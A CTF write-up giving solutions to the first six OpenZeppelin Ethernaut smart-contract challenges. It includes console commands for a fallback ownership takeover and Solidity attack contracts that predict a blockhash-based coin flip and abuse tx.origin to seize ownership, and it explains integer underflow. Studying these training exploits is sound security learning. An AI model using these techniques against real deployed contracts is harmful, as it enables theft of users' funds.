# Ethernaut-Solution

Here I am uploading the solutions to the Ethernaut Challenges to which the link is given below

https://ethernaut.openzeppelin.com/

## 1) **Hello Ethernaut**

This challenge is created to make you familiar with the interface. Here you will learn about the commands that will be helpful while playing the CTF. At this level you will also be setting up the Metamask. Once you are done with all these steps you have to find the passkey that you have to enter to pass this challenge. Also you have to find out the method using which you have to submit the password and if you have followed the ninth step then you must be having it.And still if you do not have the method name then below commands will lead you to the method name.

a) ```await contract.info()```<br/>
b) ```await contract.info1()```<br/>
c) ```await contract.info2("hello")```<br/>
d) ```await contract.infoNum()```<br/>
e) ```await contract.info42()```<br/>
f) ```await contract.theMethodName()```<br/>
g) ```await contract.method7123949()```<br/>


Now to get the passkey below is the solution

First enter the ```contract.abi``` command that helps you interact with the deployed code and come to know about it's functions. When going through the result of the above command you must have find the 'password' method, that will return the passkey to solve the challenge. So enter the ```await contract.password()``` command and you will find the passkey.

Now you have both method name and the passkey. Go and submit the passkey and the challenge will get completed.

## 2) **Fallback**

From the name of the challenge, you can easily interpret that it's related to fallback function.The challenge requires us to claim the ownership of the contract and reduce it's balance to 0.

In this contract we can claim the ownership of the contract using two functions:<br/>
a) contribute<br/>
b) receive()<br/>

In order to claim ownership using contribute function, you will require large amount of ethers.So that's not practically possible and also it's require statement will revert the transaction, even if you send the required ethers.The only way left is using receive() function.This function will get executed on calls to the contract with no data (calldata), e.g. calls made via send() or transfer().
But it also have prerequisite that msg.sender must be having some of there balance in the contract.

For this we will first call contribute function with 0.00001 ether(because amount should be less than 0.001 ether) using javascript console(Press Ctrl+Shift+I in windows)

```contract.contribute({value:"10000000000000"})```

Then we will use send method to trnasfer some ethers to the contract

```contract.send("10000000000000")```

Now you must be the owner of the contract if you have followed the above solution properly.You can check it using the following command

```await contract.owner()```

Now to withdraw the entire balance use withdraw function.

```await contract.withdraw()```

Hurray!!! The Challenge have been completed.

## 3) **Fallout**

This is one of the easiest challenge among all. It just need good observation power to solve this challenge.

In the previous versions of solidity constructor was defined with the same name as of the contract and that's where the developer have done the mistake.

The spelling of constructor name is wrong because of which it's no longer a constructor but a normal function that can be called by anyone.

By calling this function we can gain the ownership of the given contract.The command for the same is

```contract.Fal1out()```

## 4) **Coin Flip**

This challenge exploits the blockchainâ€™s inability to generate pseudo random number. In this challenge we have to predict the output which is based on previous blockhash.The following contract can be used to exploit the challenge.

```
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;
 
contract coinflip_solutions{
    address victim = <<Instance Address>>;
    uint factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
    function solve() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;
 
        bytes memory payload = abi.encodeWithSignature("flip(bool)",side);
        (bool success, ) = victim.call(payload);
        require(success, "Transaction submitted");
    }
}
```

In the above contract the first three lines of solve function is used to compute the answer. In the next line we have created a function signature to submit the answer. Then the transaction is being called  with the help of call method.
This challenge also ensures that no consecutive blockhash are same.So while calling the solve function make sure that there is some time difference otherwise transaction will get reverted.

## 5) **Telephone**

This challenge will be solved by calling the changeOwner() function from another contract because require statement states that tx.origin should not be equal to msg.sender.Below is the attack contract

```
//SPDX-License-Identifier:MIT
 
pragma solidity ^0.8.0;
 
contract telephone_solution{
 
    address victim = <<instance address>>;
    address new_owner = <<your address>>;
 
    function solve() public{
 
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)",new_owner);
        (bool success, ) = victim.call{value: 0 ether}(payload);
        require(success, "Transaction successful");
 
    }
}
```

In the above contract, the first statement of solve() function cretes a function signature. In the next statement the changeOwner() function is being called using call method.

This challenge explains the difference between tx.origin and msg.sender.The tx.origin refers to the address, from which the transaction has been originated and it can never be a contract address while msg.sender gives the immediate previous address form which the transaction has passed over.For example 

A -> B -> C

In the above case, at point C msg.sender will be B and tx.origin will be A.

## 6) **Token**

The contract at this level is vulnerable to a very well known integer overflow vulnerability. It is also among the some of the easiest challenges of this CTF.You just need to transfer more than the available tokens from the contract and you will be having a very large amount of tokens corresponding to your address.

Every integer data type have certain range that it can store. In solidity, while performing mathematical operation if that range gets crossed then instead of throwing error it will again start the count either from start or end depending on the operation.
